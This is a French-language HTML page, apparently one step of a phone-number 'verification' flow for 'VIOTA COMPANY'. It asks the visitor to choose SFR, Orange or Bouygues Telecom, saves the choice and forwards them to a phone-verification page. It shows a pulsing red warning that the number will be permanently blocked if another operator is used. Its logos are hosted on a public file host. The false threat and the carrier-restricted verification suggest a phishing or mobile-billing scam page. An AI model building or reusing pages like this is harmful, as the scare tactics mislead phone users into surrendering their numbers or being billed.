<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Choisir opérateur – VIOTA COMPANY</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
        html,body{height:100%;overflow:hidden;background:#000;color:#fff;}
        body{display:flex;align-items:center;justify-content:center;padding:20px;}
        .container{max-width:420px;width:100%;}
        .back{position:absolute;top:20px;left:20px;color:#8B00FF;font-size:1.6em;text-decoration:none;z-index:10;}
        .card{background:#111;border-radius:28px;padding:50px 30px;box-shadow:0 20px 60px rgba(139,0,255,0.3);border:1px solid #1a1a1a;}
        h1{font-size:2.4em;font-weight:900;color:#8B00FF;text-align:center;margin-bottom:15px;text-shadow:0 0 40px #8B00FF;}
        p{color:#aaa;text-align:center;font-size:1.2em;margin-bottom:40px;}
        .operators{display:grid;gap:25px;}
        .op-btn{background:rgba(26,26,26,0.6);backdrop-filter:blur(10px);border:2px solid rgba(139,0,255,0.3);border-radius:25px;padding:40px;transition:all 0.4s ease;box-shadow:0 15px 40px rgba(139,0,255,0.2);cursor:pointer;position:relative;overflow:hidden;}
        .op-btn:active{transform:scale(0.95);box-shadow:0 5px 20px rgba(139,0,255,0.5);}
        .op-btn:hover{border-color:#8B00FF;box-shadow:0 0 60px rgba(139,0,255,0.6);background:rgba(139,0,255,0.1);}
        .op-logo{width:180px;height:180px;margin:0 auto 20px;display:block;object-fit:contain;}
        .op-name{font-size:1.8em;font-weight:700;color:#fff;text-shadow:0 0 20px #8B00FF;}
        .warning{color:#ff4444;font-size:1.3em;font-weight:900;margin-top:40px;text-align:center;display:none;animation:warningPulse 1s infinite;}
        @keyframes warningPulse{0%,100%{opacity:1}50%{opacity:0.6}}
        .loader{display:none;width:60px;height:60px;border:8px solid #1a1a1a;border-top:8px solid #8B00FF;border-radius:50%;animation:spin 1s linear infinite;margin:40px auto;}
        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    </style>
</head>
<body>
    <a href="plans.html" class="back">←</a>
    <div class="container">
        <div class="card">
            <h1>Choisir votre opérateur</h1>
            <p>Sélectionnez votre opérateur pour continuer la vérification</p>

            <div class="operators">
                <!-- SFR -->
                <div class="op-btn" onclick="selectOperator('SFR')">
                    <img src="https://files.catbox.moe/9q2j0k.png" alt="SFR" class="op-logo">
                    <div class="op-name">SFR</div>
                </div>

                <!-- Orange -->
                <div class="op-btn" onclick="selectOperator('Orange')">
                    <img src="https://files.catbox.moe/3q2j0l.png" alt="Orange" class="op-logo">
                    <div class="op-name">Orange</div>
                </div>

                <!-- Bouygues Telecom -->
                <div class="op-btn" onclick="selectOperator('Bouygues')">
                    <img src="https://files.catbox.moe/4q2j0m.png" alt="Bouygues Telecom" class="op-logo">
                    <div class="op-name">Bouygues Telecom</div>
                </div>

                <!-- Autre -->
                <div class="op-btn" onclick="selectOther()">
                    <div class="op-name" style="margin-top:80px;color:#666;">Autre</div>
                </div>
            </div>

            <div id="warning" class="warning">
                Ne tentez pas de valider votre numéro avec un autre opérateur, sinon il sera bloqué définitivement !
            </div>

            <div class="loader" id="loader"></div>
        </div>
    </div>

    <script>
        function selectOperator(op) {
            localStorage.setItem('selectedOperator', op);
            document.getElementById('loader').style.display = 'block';
            setTimeout(() => {
                window.location.href = 'verify-phone.html';
            }, 2000);
        }

        function selectOther() {
            document.getElementById('warning').style.display = 'block';
            setTimeout(() => {
                window.location.href = 'index.html';
            }, 5000);
        }
    </script>
</body>
</html>
